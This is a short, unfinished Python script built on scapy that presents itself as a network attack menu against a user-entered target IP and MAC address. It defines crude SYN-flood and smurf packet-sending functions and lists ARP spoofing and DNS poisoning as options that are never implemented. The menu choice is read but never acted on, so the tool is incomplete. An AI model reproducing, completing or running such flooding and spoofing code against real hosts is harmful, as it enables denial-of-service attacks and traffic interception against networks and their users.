from scapy.all import *

BROADCAST = "ff:ff:ff:ff:ff:ff"


def syn_flood():
    msg = Ether(dst=mac_address) / IP(dst=ip_address) / TCP()
    sendp(msg, count=20)


def smurf():
    msg = Ether(dst=BROADCAST) / IP() / ICMP()
    sendp(msg, count=25)



def menu():
    print("1. SYN Flood")
    print("2. SMURF")
    print("3. ARP Spoofing")
    print("4. DNS Poisoning")


def main():
    global ip_address
    global mac_address
    print("Computer Details to attack:")
    ip_address = input("IP address: ")
    mac_address = input("MAC address: ")
    while True:
        menu()
        choice = int(input("Your choice: "))



if __name__ == "__main__":
    main()